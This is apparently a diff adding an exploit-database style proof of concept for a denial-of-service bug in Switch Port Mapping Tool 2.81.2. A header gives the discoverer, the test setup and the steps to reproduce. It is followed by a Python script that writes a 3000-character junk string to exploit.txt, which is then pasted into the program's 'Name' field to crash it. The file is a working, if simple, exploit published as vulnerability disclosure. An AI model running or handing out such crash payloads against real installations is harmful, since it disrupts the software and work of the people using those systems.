@@ -1,0 +1,23 @@
+# Exploit Title: Switch Port Mapping Tool 2.81.2 - 'Name Field' Denial of Service (PoC)  
+# Discovery by: Shubham Singh
+# Known As: Spirited Wolf [Twitter: @Pwsecspirit] 
+# Discovey Date: 2018-08-13
+# Vendor Homepage: https://switchportmapper.com/
+# Software Link: https://switchportmapper.com/download/spm2812.zip
+# Tested Version: 2.81.2
+# Tested on OS: Windows 7 Ultimate x86_64
+# Steps to Reproduce: 
+# Run the python exploit script, it will create a new file with the name
+# "exploit.txt". Just copy the text inside "exploit.txt" and start the 
+# Managed Switch Port Mapping Tool 2.81.2 program and click on "Enter Key".
+# In the 'Name field' paste the content of "exploit.txt" and click 
+# on "OK". You will see a crash.
+
+#!/usr/bin/env python
+
+file = open("exploit.txt","wb")
+junk = "A" * 3000
+exploit = junk
+buf = exploit
+file.write(buf)
+file.close()
